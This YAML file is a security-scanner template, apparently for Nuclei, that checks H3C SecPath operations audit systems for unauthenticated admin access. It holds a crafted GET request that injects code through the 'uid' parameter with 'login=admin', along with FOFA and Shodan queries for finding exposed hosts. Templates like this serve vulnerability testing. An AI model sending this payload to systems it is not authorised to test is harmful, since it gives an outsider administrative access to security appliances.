http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - admin
    - "\u5BA1\u8BA1\u7BA1\u7406\u5458"
    - "\u9519\u8BEF\u7684id"
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin'
id: unauthorized-h3csecparh-login
info:
  author: ritikchaddha
  description: H3C server was able to be accessed with no authentication requirements
    in place.
  metadata:
    fofa-query: "app=\"H3C-SecPath-\u8FD0\u7EF4\u5BA1\u8BA1\u7CFB\u7EDF\" && body=\"\
      2018\""
    max-request: 1
    shodan-query: "http.html:\"H3C-SecPath-\u8FD0\u7EF4\u5BA1\u8BA1\u7CFB\u7EDF\""
    verified: true
  name: H3C Server - Unauthenticated Access
  severity: high
  tags: h3c,default-login,unauth,misconfig
